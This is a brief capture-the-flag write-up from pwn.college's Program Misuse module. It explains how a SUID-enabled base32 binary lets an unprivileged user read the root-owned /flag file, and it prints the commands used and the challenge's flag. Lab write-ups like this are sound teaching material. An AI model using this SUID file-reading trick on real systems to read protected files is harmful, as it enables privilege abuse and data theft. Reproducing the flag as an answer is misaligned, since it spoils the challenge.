---
layout: page
title: "Challenge Name: base32"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/base32`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/base32
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/base32
```

-The `s` in `-rws` indicates it's a SUID binary.
-`base32` runs with **root privileges**.

## 🚀 Exploitation

The `base32` command lets you encode or decode data using Base32, a binary-to-text encoding scheme that uses 32 ASCII characters.

```bash
myflag=$(base32 /flag)
echo "$myflag" | base32 --decode
```

Output:
```
pwn.college{0yrk_SqiqllhJjs5dX0aI_peczm.dJTNxwSM0IzMyEzW}
```

      
